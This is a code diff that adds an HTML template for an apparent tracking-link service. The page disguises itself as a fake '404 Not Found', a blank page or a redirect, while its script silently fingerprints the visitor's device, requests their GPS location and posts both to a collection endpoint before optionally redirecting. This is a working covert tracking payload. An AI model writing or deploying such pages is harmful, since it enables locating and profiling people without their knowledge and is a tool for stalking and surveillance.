@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+{% if link.decoy_mode == '404' %}
+<title>404 Not Found</title>
+{% elif link.decoy_mode == 'blank' %}
+<title></title>
+{% else %}
+<title>Redirecting…</title>
+{% endif %}
+<style>
+  body{margin:0;font-family:sans-serif;background:#f9fafb;display:flex;align-items:center;justify-content:center;min-height:100vh}
+  .box{text-align:center;padding:3rem;max-width:400px}
+  h1{font-size:6rem;font-weight:700;color:#d1d5db;margin:0}
+  p{color:#6b7280;margin:.5rem 0}
+</style>
+</head>
+<body>
+
+{% if link.decoy_mode == '404' %}
+<div class="box">
+  <h1>404</h1>
+  <p style="font-size:1.1rem;color:#374151">Page Not Found</p>
+  <p>The page you are looking for doesn't exist or has been moved.</p>
+</div>
+{% elif link.decoy_mode == 'blank' %}
+<!-- blank -->
+{% else %}
+<div class="box">
+  <p>Redirecting…</p>
+</div>
+{% endif %}
+
+<script>
+(function(){
+  const TOKEN = {{ token|tojson }};
+  const HIT_ID = {{ hit_id|tojson }};
+  const FP_URL = '/t/' + TOKEN + '/fp';
+
+  // Detect browser name from UA
+  function detectBrowser() {
+    const ua = navigator.userAgent;
+    if (/Edg\//.test(ua)) return 'Edge';
+    if (/OPR\/|Opera/.test(ua)) return 'Opera';
+    if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) return 'Chrome';
+    if (/Firefox\//.test(ua)) return 'Firefox';
+    if (/Safari\//.test(ua) && !/Chrome/.test(ua)) return 'Safari';
+    return 'Unknown';
+  }
+
+  // Collect plugins list (limited, but gives a signal)
+  function pluginList() {
+    try {
+      const ps = [];
+      for (let i = 0; i < Math.min(navigator.plugins.length, 10); i++) {
+        ps.push(navigator.plugins[i].name);
+      }
+      return ps.join(', ');
+    } catch(e) { return ''; }
+  }
+
+  const payload = {
+    hit_id:   HIT_ID,
+    screen:   screen.width + 'x' + screen.height + ' (' + screen.colorDepth + 'bit)',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language || '',
+    platform: navigator.platform || '',
+    browser:  detectBrowser(),
+    plugins:  pluginList(),
+  };
+
+  // Send fingerprint immediately (silent)
+  function send(data) {
+    fetch(FP_URL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data),
+      keepalive: true,
+    }).catch(function(){});
+  }
+
+  // Request GPS — browser shows its own permission dialog
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        send(Object.assign({}, payload, {
+          gps_lat:      pos.coords.latitude,
+          gps_lon:      pos.coords.longitude,
+          gps_accuracy: pos.coords.accuracy,
+        }));
+      },
+      function() {
+        // Permission denied or unavailable — send without GPS
+        send(payload);
+      },
+      {timeout: 8000, maximumAge: 0}
+    );
+  } else {
+    send(payload);
+  }
+
+  {% if link.decoy_mode == 'redirect' and link.redirect_url %}
+  // Redirect after a brief pause so fingerprint fetch can initiate
+  setTimeout(function(){ window.location.replace({{ link.redirect_url|tojson }}); }, 300);
+  {% endif %}
+})();
+</script>
+</body>
+</html>
